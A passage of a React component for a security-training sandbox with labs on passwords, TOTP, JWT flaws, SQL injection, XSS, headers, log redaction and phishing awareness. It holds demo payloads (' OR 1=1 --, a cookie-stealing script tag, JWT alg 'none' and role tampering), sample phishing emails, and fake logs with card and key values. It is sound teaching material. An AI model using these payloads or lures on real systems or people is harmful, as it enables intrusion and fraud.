import React, { useState, useEffect } from 'react';
import {
  KeyRound,
  ShieldAlert,
  Search,
  Terminal,
  Mail,
  CheckCircle2,
  AlertTriangle,
  XCircle,
  Copy,
  Play,
  RotateCcw,
  ExternalLink,
  Shield,
  Eye,
  EyeOff,
  Lock,
  Unlock,
  AlertOctagon,
  FileCode,
  Sliders,
  Check,
} from 'lucide-react';

interface SandboxViewProps {
  initialLab?: string;
  onRecordEvidence?: (auditItemId: string, notes: string) => void;
}

export const SandboxView: React.FC<SandboxViewProps> = ({
  initialLab = 'auth',
  onRecordEvidence,
}) => {
  const [activeModule, setActiveModule] = useState<
    'auth' | 'input_validation' | 'security_checks' | 'logging' | 'awareness'
  >('auth');

  // Sub-tab selections
  const [authSubTab, setAuthSubTab] = useState<'entropy' | 'totp' | 'jwt' | 'bruteforce'>('entropy');
  const [inputSubTab, setInputSubTab] = useState<'sqli' | 'xss' | 'schema'>('sqli');
  const [secSubTab, setSecSubTab] = useState<'headers' | 'cookies'>('headers');
  const [logSubTab, setLogSubTab] = useState<'redaction' | 'event'>('redaction');
  const [copiedText, setCopiedText] = useState<string | null>(null);

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(null), 2000);
  };

  /* -------------------------------------------------------------
   * 1. AUTH LAB STATE & LOGIC
   * ------------------------------------------------------------- */
  // A. Password Entropy
  const [passwordInput, setPasswordInput] = useState('P@ssw0rd2026!');
  const [showPassword, setShowPassword] = useState(false);

  const calculateEntropy = (pwd: string) => {
    if (!pwd) return { bits: 0, crackTime: 'Instant', poolSize: 0, isDictionary: false };
    let poolSize = 0;
    if (/[a-z]/.test(pwd)) poolSize += 26;
    if (/[A-Z]/.test(pwd)) poolSize += 26;
    if (/[0-9]/.test(pwd)) poolSize += 10;
    if (/[^a-zA-Z0-9]/.test(pwd)) poolSize += 33;
    if (poolSize === 0) poolSize = 1;

    const bits = Math.round(pwd.length * (Math.log2(poolSize)));
    const commonList = ['password', '123456', 'p@ssword', 'admin', 'qwerty', 'welcome', 'letmein'];
    const isDictionary = commonList.some(w => pwd.toLowerCase().includes(w));

    let crackTime = 'Instant';
    if (bits < 28) crackTime = '< 1 millisecond';
    else if (bits < 40) crackTime = 'A few seconds';
    else if (bits < 55) crackTime = 'Several hours to 3 days';
    else if (bits < 70) crackTime = 'Approx. 2 to 5 years';
    else if (bits < 90) crackTime = '1,200+ years';
    else crackTime = 'Centuries (Mathematically infeasible)';

    return { bits, crackTime, poolSize, isDictionary };
  };
  const entropyStats = calculateEntropy(passwordInput);

  // B. TOTP MFA Simulator
  const [totpSecret, setTotpSecret] = useState('JBSWY3DPEHPK3PXP');
  const [totpSecondsLeft, setTotpSecondsLeft] = useState(30);
  const [currentTotpCode, setCurrentTotpCode] = useState('482910');
  const [userTotpAttempt, setUserTotpAttempt] = useState('');
  const [totpVerificationResult, setTotpVerificationResult] = useState<
    'idle' | 'success' | 'failure' | 'replayed'
  >('idle');
  const [usedCodes, setUsedCodes] = useState<string[]>([]);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date();
      const seconds = 30 - (now.getSeconds() % 30);
      setTotpSecondsLeft(seconds);

      // Generate simulated RFC 6238 6-digit code based on time slice
      const timeSlice = Math.floor(now.getTime() / 30000);
      let hash = 0;
      for (let i = 0; i < totpSecret.length; i++) {
        hash = (hash << 5) - hash + totpSecret.charCodeAt(i) + timeSlice;
        hash |= 0;
      }
      const code = Math.abs(hash % 900000 + 100000).toString();
      setCurrentTotpCode(code);
    }, 1000);
    return () => clearInterval(timer);
  }, [totpSecret]);

  const verifyTotp = () => {
    if (userTotpAttempt === currentTotpCode) {
      if (usedCodes.includes(userTotpAttempt)) {
        setTotpVerificationResult('replayed');
      } else {
        setTotpVerificationResult('success');
        setUsedCodes([...usedCodes, userTotpAttempt]);
      }
    } else {
      setTotpVerificationResult('failure');
    }
  };

  // C. JWT Security Analyzer
  const [jwtHeader, setJwtHeader] = useState({ alg: 'HS256', typ: 'JWT' });
  const [jwtPayload, setJwtPayload] = useState({
    sub: 'usr_884210',
    username: 'alex.intern',
    role: 'intern',
    exp: Math.floor(Date.now() / 1000) + 3600,
  });
  const [jwtAlgNoneExploit, setJwtAlgNoneExploit] = useState(false);
  const [jwtExpiredExploit, setJwtExpiredExploit] = useState(false);
  const [jwtRoleExploit, setJwtRoleExploit] = useState(false);

  const getComputedJwt = () => {
    const header = { ...jwtHeader, alg: jwtAlgNoneExploit ? 'none' : 'HS256' };
    const payload = {
      ...jwtPayload,
      role: jwtRoleExploit ? 'admin' : 'intern',
      exp: jwtExpiredExploit ? Math.floor(Date.now() / 1000) - 600 : Math.floor(Date.now() / 1000) + 3600,
    };
    const b64H = btoa(JSON.stringify(header));
    const b64P = btoa(JSON.stringify(payload));
    const sig = jwtAlgNoneExploit ? '' : 'k8Yg7T_x9Jp2_Mv1Wz87aB-4kL98cQ1v2s7L4';
    return `${b64H}.${b64P}.${sig}`;
  };

  // D. Brute Force & Rate Limit Simulator
  const [failedAttempts, setFailedAttempts] = useState(0);
  const [isLockedOut, setIsLockedOut] = useState(false);
  const [lockoutTimer, setLockoutTimer] = useState(0);

  const handleSimulatedFailedLogin = () => {
    if (isLockedOut) return;
    const nextAttempts = failedAttempts + 1;
    setFailedAttempts(nextAttempts);
    if (nextAttempts >= 5) {
      setIsLockedOut(true);
      setLockoutTimer(15);
    }
  };

  useEffect(() => {
    if (isLockedOut && lockoutTimer > 0) {
      const countdown = setTimeout(() => {
        setLockoutTimer(lockoutTimer - 1);
      }, 1000);
      return () => clearTimeout(countdown);
    } else if (isLockedOut && lockoutTimer === 0) {
      setIsLockedOut(false);
      setFailedAttempts(0);
    }
  }, [isLockedOut, lockoutTimer]);

  /* -------------------------------------------------------------
   * 2. INPUT VALIDATION LAB STATE & LOGIC
   * ------------------------------------------------------------- */
  // A. SQL Injection
  const [sqliInput, setSqliInput] = useState("' OR 1=1 --");
  const vulnerableSqlQuery = `SELECT id, username, email, is_admin FROM users WHERE username = '${sqliInput}' AND status = 'active';`;
  const safeSqlQuery = `PREPARE user_query AS SELECT id, username, email, is_admin FROM users WHERE username = $1 AND status = 'active';\nEXECUTE user_query('${sqliInput.replace(/'/g, "''")}');`;

  const isSqliExploited = sqliInput.includes("' OR") || sqliInput.includes("' UNION") || sqliInput.includes("--");

  // B. XSS Sanitizer
  const [xssInput, setXssInput] = useState("<script>alert('Stealing session token: ' + document.cookie)</script>");
  const escapeHtmlEntities = (str: string) => {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  };

  // C. Schema & Allowlist validation
  const [schemaInputJson, setSchemaInputJson] = useState(
    JSON.stringify(
      {
        fullName: 'Alex Intern',
        email: 'alex@intern.security.test',
        role: 'super_admin', // Unauthorized mass assignment
        accountBalance: 999999, // Unauthorized parameter
      },
      null,
      2
    )
  );

  let schemaValidationResult: { valid: boolean; strippedKeys: string[]; error?: string } = {
    valid: false,
    strippedKeys: [],
  };
  try {
    const parsed = JSON.parse(schemaInputJson);
    const allowedKeys = ['fullName', 'email', 'phone'];
    const forbiddenFound = Object.keys(parsed).filter((k) => !allowedKeys.includes(k));
    schemaValidationResult = {
      valid: forbiddenFound.length === 0,
      strippedKeys: forbiddenFound,
    };
  } catch (err: any) {
    schemaValidationResult = {
      valid: false,
      strippedKeys: [],
      error: 'Invalid JSON syntax: ' + err.message,
    };
  }

  /* -------------------------------------------------------------
   * 3. SECURITY CHECKS LAB STATE & LOGIC
   * ------------------------------------------------------------- */
  // A. HTTP Headers Evaluator
  const presetHeaderConfigs = {
    hardened: {
      'Content-Security-Policy': "default-src 'self'; script-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests",
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Access-Control-Allow-Origin': 'https://portal.apexpay.com',
    },
    vulnerable: {
      'Content-Security-Policy': '',
      'Strict-Transport-Security': '',
      'X-Content-Type-Options': '',
      'X-Frame-Options': '',
      'Referrer-Policy': 'unsafe-url',
      'Access-Control-Allow-Origin': '*',
    },
  };
  const [customHeaders, setCustomHeaders] = useState<Record<string, string>>(presetHeaderConfigs.vulnerable);

  const calculateHeaderScore = (headers: Record<string, string>) => {
    let score = 0;
    const maxScore = 100;
    const deductions: string[] = [];

    if (headers['Content-Security-Policy'] && headers['Content-Security-Policy'].length > 10) {
      score += 30;
    } else {
      deductions.push('Missing Content-Security-Policy (-30 pts: High XSS & data injection risk)');
    }

    if (headers['Strict-Transport-Security'] && headers['Strict-Transport-Security'].includes('max-age=')) {
      score += 25;
    } else {
      deductions.push('Missing Strict-Transport-Security (-25 pts: SSL strip attack vulnerability)');
    }

    if (headers['X-Content-Type-Options'] === 'nosniff') {
      score += 15;
    } else {
      deductions.push('Missing X-Content-Type-Options: nosniff (-15 pts: MIME-type sniffing risk)');
    }

    if (headers['X-Frame-Options'] === 'DENY' || headers['X-Frame-Options'] === 'SAMEORIGIN') {
      score += 15;
    } else {
      deductions.push('Missing X-Frame-Options (-15 pts: Clickjacking vulnerability)');
    }

    if (headers['Access-Control-Allow-Origin'] && headers['Access-Control-Allow-Origin'] !== '*') {
      score += 15;
    } else {
      deductions.push('Wildcard or Missing CORS Allow-Origin (-15 pts: Cross-domain data leakage)');
    }

    let grade = 'F';
    if (score >= 90) grade = 'A+';
    else if (score >= 80) grade = 'A';
    else if (score >= 70) grade = 'B';
    else if (score >= 50) grade = 'C';
    else if (score >= 35) grade = 'D';

    return { score, grade, deductions };
  };

  const headerAudit = calculateHeaderScore(customHeaders);

  // B. Cookie Security Attributes
  const [cookieHttpOnly, setCookieHttpOnly] = useState(false);
  const [cookieSecure, setCookieSecure] = useState(false);
  const [cookieSameSite, setCookieSameSite] = useState<'None' | 'Lax' | 'Strict'>('None');

  /* -------------------------------------------------------------
   * 4. LOGGING LAB STATE & LOGIC
   * ------------------------------------------------------------- */
  const defaultLogSample = `2026-10-08T07:14:02.112Z [INFO] POST /api/v1/auth/login email=j.smith@client.com password=SuperSecretPassword123! ip=192.168.1.42
2026-10-08T07:14:03.450Z [INFO] POST /api/v1/checkout user_id=usr_991 card_number=4532789012345678 cvv=491 ssn=987-65-4320
2026-10-08T07:14:05.188Z [DEBUG] External API Request Authorization="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.token_payload_secret" api_key=sk_live_99a8b7c6d5e4f3a2
2026-10-08T07:14:06.002Z [WARN] Failed login attempt for user admin from IP 203.0.113.19`;

  const [rawLogs, setRawLogs] = useState(defaultLogSample);

  const sanitizeLogText = (text: string) => {
    let sanitized = text;
    // Redact password
    sanitized = sanitized.replace(/(password=)([^\s&]+)/gi, '$1[REDACTED_PASSWORD]');
    // Redact CVV
    sanitized = sanitized.replace(/(cvv=)([0-9]{3,4})/gi, '$1[REDACTED_CVV]');
    // Redact SSN
    sanitized = sanitized.replace(/(ssn=)(\d{3}-\d{2}-\d{4})/gi, '$1[REDACTED_SSN]');
    // Redact 16-digit credit card PAN
    sanitized = sanitized.replace(/(card_number=)(\d{4})\d{8}(\d{4})/gi, '$1$2-XXXX-XXXX-$3');
    // Redact Bearer Token
    sanitized = sanitized.replace(/(Bearer\s+)([A-Za-z0-9-_.]+)/gi, '$1[REDACTED_TOKEN]');
    // Redact API key
    sanitized = sanitized.replace(/(api_key=)([A-Za-z0-9_-]+)/gi, '$1[REDACTED_SECRET_KEY]');
    return sanitized;
  };

  const sanitizedLogs = sanitizeLogText(rawLogs);
  const detectedViolationsCount =
    (rawLogs.match(/password=[^[]/gi) || []).length +
    (rawLogs.match(/cvv=\d/gi) || []).length +
    (rawLogs.match(/ssn=\d/gi) || []).length +
    (rawLogs.match(/card_number=\d/gi) || []).length +
    (rawLogs.match(/Bearer\s+eyJ/gi) || []).length +
    (rawLogs.match(/api_key=sk_/gi) || []).length;

  /* -------------------------------------------------------------
   * 5. AWARENESS LAB STATE & LOGIC
   * ------------------------------------------------------------- */
  const phishingScenarios = [
    {
      id: 'scen_1',
      title: 'Urgent: IT Helpdesk Password Expiration',
      senderName: 'Apex IT Security Desk',
      senderEmail: 'support@apexpay-security-reset.cc', // Flag 1: Spoofed Lookalike Domain
      subject: 'URGENT: Your password expires in 15 minutes. Take immediate action!', // Flag 2: Coercive urgency
      date: 'Today, 09:12 AM',
      body: `Dear Employee,\n\nWe detected unauthorized login attempts from IP 185.220.101.4.\nYour corporate access will be terminated immediately unless you verify your credentials right now.\n\nPlease click the button below to re-verify your MFA token:\n\n[ https://portal.apexpay.com.external-verify-login.tk/mfa-auth ]\n\nThank you,\nIT Security Division`,
      flags: [
        { id: 'flag_domain', label: 'Spoofed Lookalike Domain (@apexpay-security-reset.cc instead of @apexpay.internal)', detected: false },
        { id: 'flag_urgency', label: 'Psychological Coercion / Artificial Panic ("expires in 15 minutes", "terminated immediately")', detected: false },
        { id: 'flag_link', label: 'Deceptive Hyperlink pointing to phishing domain (.tk TLD disguise)', detected: false },
        { id: 'flag_salutation', label: 'Impersonal Generic Salutation ("Dear Employee" instead of real name)', detected: false },
      ],
    },
    {
      id: 'scen_2',
      title: 'Executive Wire Transfer Request (Spear Phishing / CEO Fraud)',
      senderName: 'Victoria Sterling (CEO)',
      senderEmail: 'v.sterling.ceo@gmail-confidential-apex.org',
      subject: 'CONFIDENTIAL: Urgent acquisition wire deposit required today',
      date: 'Today, 10:45 AM',
      body: `Alex,\n\nI am currently in an NDA board meeting in London and cannot take voice calls. We are closing an emergency vendor deal.\n\nPlease urgently wire $48,500 to the routing numbers attached in the invoice file.\nDo not discuss this with the accounting team until the press release is out at 4 PM.\n\nAttachment: urgent_vendor_invoice_october.pdf.exe\n\nBest,\nVictoria`,
      flags: [
        { id: 'flag_domain', label: 'Freemail / Fake Executive Domain (@gmail-confidential-apex.org)', detected: false },
        { id: 'flag_ext', label: 'Dangerous Double-Extension Malicious Attachment (.pdf.exe executable)', detected: false },
        { id: 'flag_protocol', label: 'Bypass of Standard Financial Controls ("Do not discuss with accounting team")', detected: false },
        { id: 'flag_phone', label: 'Channel Isolation ("Cannot take voice calls" preventing voice verification)', detected: false },
      ],
    },
  ];

  const [activePhishingIndex, setActivePhishingIndex] = useState(0);
  const [detectedFlags, setDetectedFlags] = useState<Record<string, boolean>>({});

  const currentScenario = phishingScenarios[activePhishingIndex];

  const toggleFlag = (flagId: string) => {
    setDetectedFlags((prev) => ({
      ...prev,
      [flagId]: !prev[flagId],
    }));
  };

  const flagsFoundForCurrent = currentScenario.flags.filter((f) => detectedFlags[f.id]).length;
  const allFlagsFound = flagsFoundForCurrent === currentScenario.flags.length;

  return (
    <div className="space-y-6">
      {/* Module Selector Bar */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-2 flex flex-wrap gap-1.5 items-center justify-between">
        <div className="flex flex-wrap gap-1">
          {[
            { id: 'auth', label: '1. Authentication Lab', icon: KeyRound },
            { id: 'input_validation', label: '2. Input Validation Lab', icon: Search },
            { id: 'security_checks', label: '3. Security Checks Lab', icon: ShieldAlert },
            { id: 'logging', label: '4. Logging & Redaction Lab', icon: Terminal },
            { id: 'awareness', label: '5. Awareness Challenge', icon: Mail },
          ].map((mod) => {
            const Icon = mod.icon;
            const isActive = activeModule === mod.id;
            return (
              <button
                key={mod.id}
                onClick={() => setActiveModule(mod.id as any)}
                className={`flex items-center gap-2 px-3 py-2 text-xs font-semibold rounded-lg transition-colors whitespace-nowrap ${
                  isActive
                    ? 'bg-indigo-600 text-white shadow-sm'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{mod.label}</span>
              </button>
            );
          })}
        </div>

        <div className="px-3 text-xs text-slate-400 hidden lg:flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
          <span>Interactive CyberSec Simulation Engine Active</span>
        </div>
      </div>

      {/* ---------------- MODULE 1: AUTHENTICATION ---------------- */}
      {activeModule === 'auth' && (
        <div className="space-y-6">
          {/* Sub-tabs */}
          <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
            {[
              { id: 'entropy', label: 'Password Entropy & NIST 800-63B' },
              { id: 'totp', label: 'MFA TOTP Authenticator (RFC 6238)' },
              { id: 'jwt', label: 'JWT Security & alg:none Flaw' },
              { id: 'bruteforce', label: 'Brute Force & Rate Limit Throttling' },
            ].map((sub) => (
              <button
                key={sub.id}
                onClick={() => setAuthSubTab(sub.id as any)}
                className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                  authSubTab === sub.id
                    ? 'bg-slate-800 text-indigo-300 border border-slate-700'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
                }`}
              >
                {sub.label}
              </button>
            ))}
          </div>

          {authSubTab === 'entropy' && (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
                <div>
                  <h3 className="text-base font-semibold text-white">Password Entropy & Strength Calculator</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Evaluates character pool space, information entropy bits ($H = L \times \log_2(N)$), and NIST SP 800-63B memorized secret guidelines.
                  </p>
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-300">Test Password / Passphrase</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={passwordInput}
                      onChange={(e) => setPasswordInput(e.target.value)}
                      placeholder="Type a password..."
                      className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3.5 py-2.5 text-sm text-white font-mono focus:outline-none focus:border-indigo-500 pr-10"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-2.5 text-slate-500 hover:text-slate-300"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {/* Quick Presets */}
                <div className="flex flex-wrap items-center gap-2 pt-1">
                  <span className="text-xs text-slate-500">Test Presets:</span>
                  {[
                    { label: 'Weak (P@ssword123)', val: 'P@ssword123' },
                    { label: 'Short Complex (aB9#)', val: 'aB9#' },
                    { label: 'NIST Recommended Passphrase', val: 'correct horse battery staple 2026' },
                    { label: 'High-Entropy Random', val: 'k9!Xv$82mL#pQz1&' },
                  ].map((p, idx) => (
                    <button
                      key={idx}
                      onClick={() => setPasswordInput(p.val)}
                      className="text-xs px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700/60"
                    >
                      {p.label}
                    </button>
                  ))}
                </div>

                {/* Metric Display */}
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
                  <div className="bg-slate-950 border border-slate-800 p-3 rounded-lg">
                    <span className="text-xs text-slate-500 block">Length</span>
                    <span className="text-lg font-bold font-mono text-white tabular-nums">{passwordInput.length} chars</span>
                  </div>
                  <div className="bg-slate-950 border border-slate-800 p-3 rounded-lg">
                    <span className="text-xs text-slate-500 block">Pool Space ($N$)</span>
                    <span className="text-lg font-bold font-mono text-white tabular-nums">{entropyStats.poolSize}</span>
                  </div>
                  <div className="bg-slate-950 border border-slate-800 p-3 rounded-lg">
                    <span className="text-xs text-slate-500 block">Entropy</span>
                    <span className={`text-lg font-bold font-mono tabular-nums ${entropyStats.bits >= 64 ? 'text-emerald-400' : entropyStats.bits >= 45 ? 'text-amber-400' : 'text-rose-400'}`}>
                      {entropyStats.bits} bits
                    </span>
                  </div>
                  <div className="bg-slate-950 border border-slate-800 p-3 rounded-lg">
                    <span className="text-xs text-slate-500 block">Est. Offline Crack</span>
                    <span className="text-xs font-semibold text-slate-200 block truncate mt-1">
                      {entropyStats.crackTime}
                    </span>
                  </div>
                </div>

                {entropyStats.isDictionary && (
                  <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300 flex items-start gap-2">
                    <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400 mt-0.5" />
                    <span>Warning: Contains common breach dictionary string. Dictionary attacks crack this instantly regardless of length.</span>
                  </div>
                )}
              </div>

              {/* NIST SP 800-63B Checklist Side */}
              <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <h4 className="text-sm font-semibold text-white">NIST SP 800-63B Compliance Audit</h4>
                <div className="space-y-2.5 text-xs">
                  <div className="flex items-center justify-between p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <span className="text-slate-300">Minimum 12 Characters Length</span>
                    {passwordInput.length >= 12 ? (
                      <span className="text-emerald-400 font-semibold flex items-center gap-1">
                        <Check className="w-3.5 h-3.5" /> Compliant ({passwordInput.length})
                      </span>
                    ) : (
                      <span className="text-rose-400 font-semibold flex items-center gap-1">
                        <XCircle className="w-3.5 h-3.5" /> Non-Compliant ({passwordInput.length}/12)
                      </span>
                    )}
                  </div>

                  <div className="flex items-center justify-between p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <span className="text-slate-300">Compromised / Dictionary Blacklist Check</span>
                    {!entropyStats.isDictionary ? (
                      <span className="text-emerald-400 font-semibold flex items-center gap-1">
                        <Check className="w-3.5 h-3.5" /> Passed
                      </span>
                    ) : (
                      <span className="text-rose-400 font-semibold flex items-center gap-1">
                        <XCircle className="w-3.5 h-3.5" /> Blocked Word
                      </span>
                    )}
                  </div>

                  <div className="flex items-center justify-between p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <span className="text-slate-300">Entropy Threshold (&ge; 60 bits)</span>
                    {entropyStats.bits >= 60 ? (
                      <span className="text-emerald-400 font-semibold flex items-center gap-1">
                        <Check className="w-3.5 h-3.5" /> Strong ({entropyStats.bits}b)
                      </span>
                    ) : (
                      <span className="text-amber-400 font-semibold flex items-center gap-1">
                        <AlertTriangle className="w-3.5 h-3.5" /> Weak ({entropyStats.bits}b)
                      </span>
                    )}
                  </div>

                  <div className="flex items-center justify-between p-2.5 bg-slate-950 rounded-lg border border-slate-800">
                    <span className="text-slate-300">Permits Spaces & Emojis</span>
                    <span className="text-emerald-400 font-semibold flex items-center gap-1">
                      <Check className="w-3.5 h-3.5" /> Supported
                    </span>
                  </div>
                </div>

                <div className="pt-2">
                  <button
                    onClick={() => {
                      if (onRecordEvidence) {
                        onRecordEvidence(
                          'AUTH-01',
                          `Tested password entropy calculator with "${passwordInput}". Entropy: ${entropyStats.bits} bits. Crack time: ${entropyStats.crackTime}. NIST check: ${passwordInput.length >= 12 ? 'PASS' : 'FAIL'}.`
                        );
                      }
                    }}
                    className="w-full py-2 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Attach Test Evidence to AUTH-01 Checklist</span>
                  </button>
                </div>
              </div>
            </div>
          )}

          {authSubTab === 'totp' && (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
                <div>
                  <h3 className="text-base font-semibold text-white">MFA Time-Based One-Time Password (RFC 6238)</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Simulates a cryptographic TOTP token generator with 30-second time-slice windows and replay protection.
                  </p>
                </div>

                <div className="bg-slate-950 border border-slate-800 rounded-lg p-4 flex items-center justify-between">
                  <div>
                    <span className="text-xs text-slate-500 block">Secret Seed (Base32)</span>
                    <span className="text-sm font-mono text-indigo-400 font-semibold">{totpSecret}</span>
                  </div>
                  <button
                    onClick={() => setTotpSecret('MFRGGZDFMY2TGMRV')}
                    className="text-xs text-slate-400 hover:text-white px-2 py-1 bg-slate-800 rounded border border-slate-700"
                  >
                    Regenerate Seed
                  </button>
                </div>

                {/* Token Display with Countdown */}
                <div className="bg-slate-950 border border-indigo-500/30 rounded-xl p-6 flex flex-col sm:flex-row items-center justify-between gap-4">
                  <div className="text-center sm:text-left">
                    <span className="text-xs text-slate-400 block mb-1">Current Active 6-Digit Token</span>
                    <span className="text-3xl font-extrabold font-mono text-white tracking-widest tabular-nums">
                      {currentTotpCode.slice(0, 3)} {currentTotpCode.slice(3)}
                    </span>
                  </div>

                  <div className="flex items-center gap-3">
                    <div className="relative w-12 h-12 flex items-center justify-center">
                      <svg className="w-12 h-12 -rotate-90">
                        <circle cx="24" cy="24" r="20" stroke="#1e293b" strokeWidth="4" fill="none" />
                        <circle
                          cx="24"
                          cy="24"
                          r="20"
                          stroke={totpSecondsLeft < 6 ? '#f43f5e' : '#6366f1'}
                          strokeWidth="4"
                          fill="none"
                          strokeDasharray="125.6"
                          strokeDashoffset={125.6 - (125.6 * totpSecondsLeft) / 30}
                          className="transition-all duration-1000"
                        />
                      </svg>
                      <span className="absolute text-xs font-mono font-bold text-white tabular-nums">
                        {totpSecondsLeft}s
                      </span>
                    </div>
                    <button
                      onClick={() => setUserTotpAttempt(currentTotpCode)}
                      className="px-2.5 py-1.5 text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 whitespace-nowrap"
                    >
                      Autofill Code
                    </button>
                  </div>
                </div>

                {/* Verification form */}
                <div className="space-y-3 pt-2">
                  <label className="text-xs font-medium text-slate-300">Test Verification Endpoint</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      maxLength={6}
                      value={userTotpAttempt}
                      onChange={(e) => setUserTotpAttempt(e.target.value)}
                      placeholder="Enter 6-digit code..."
                      className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-sm text-white font-mono text-center tracking-widest focus:outline-none focus:border-indigo-500"
                    />
                    <button
                      onClick={verifyTotp}
                      className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-semibold transition-colors"
                    >
                      Verify Token
                    </button>
                  </div>

                  {totpVerificationResult === 'success' && (
                    <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-xs text-emerald-300 flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                      <span>Valid TOTP token verified successfully within acceptable window!</span>
                    </div>
                  )}
                  {totpVerificationResult === 'replayed' && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300 flex items-center gap-2">
                      <AlertOctagon className="w-4 h-4 text-rose-400" />
                      <span>Replay Attack Prevented: This token was already consumed during this window!</span>
                    </div>
                  )}
                  {totpVerificationResult === 'failure' && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300 flex items-center gap-2">
                      <XCircle className="w-4 h-4 text-rose-400" />
                      <span>Invalid TOTP token or window expired! Verification rejected (401 Unauthorized).</span>
                    </div>
                  )}
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <h4 className="text-sm font-semibold text-white">MFA Auditor Insights</h4>
                <div className="text-xs text-slate-300 space-y-2 leading-relaxed">
                  <p>
                    <strong>RFC 6238 Standard:</strong> TOTP calculates T = floor((CurrentUnixTime - T0) / X), where X = 30 seconds.
                  </p>
                  <p>
                    <strong>Clock Drift Tolerance:</strong> Auditors must verify server allows at most $\pm 1$ step (30s past and future) to account for slight client clock skew without opening an excessive attack window.
                  </p>
                  <p>
                    <strong>Replay Cache:</strong> Servers must store consumed TOTPs in Redis until the 30-second window expires to prevent interception replays.
                  </p>
                </div>

                <button
                  onClick={() => {
                    if (onRecordEvidence) {
                      onRecordEvidence(
                        'AUTH-02',
                        `Verified TOTP RFC 6238 implementation in sandbox. Code generator and replay attack detection passed. Window tolerance: 30s.`
                      );
                    }
                  }}
                  className="w-full mt-4 py-2 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Attach Test Evidence to AUTH-02</span>
                </button>
              </div>
            </div>
          )}

          {authSubTab === 'jwt' && (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <div>
                  <h3 className="text-base font-semibold text-white">JSON Web Token (JWT) Security & Exploit Tester</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Examine RFC 7519 structure and test critical token vulnerabilities: algorithm confusion (`alg: none`), expired claims, and signature tampering.
                  </p>
                </div>

                {/* Exploit Toggles */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 bg-slate-950 p-3 rounded-lg border border-slate-800">
                  <button
                    onClick={() => setJwtAlgNoneExploit(!jwtAlgNoneExploit)}
                    className={`p-2.5 rounded border text-left text-xs transition-colors ${
                      jwtAlgNoneExploit
                        ? 'bg-rose-500/20 border-rose-500/40 text-rose-300'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    <span className="font-semibold block">Exploit: alg: "none"</span>
                    <span className="text-[11px] opacity-80">Strip signature requirement</span>
                  </button>

                  <button
                    onClick={() => setJwtRoleExploit(!jwtRoleExploit)}
                    className={`p-2.5 rounded border text-left text-xs transition-colors ${
                      jwtRoleExploit
                        ? 'bg-amber-500/20 border-amber-500/40 text-amber-300'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    <span className="font-semibold block">Tamper: role=admin</span>
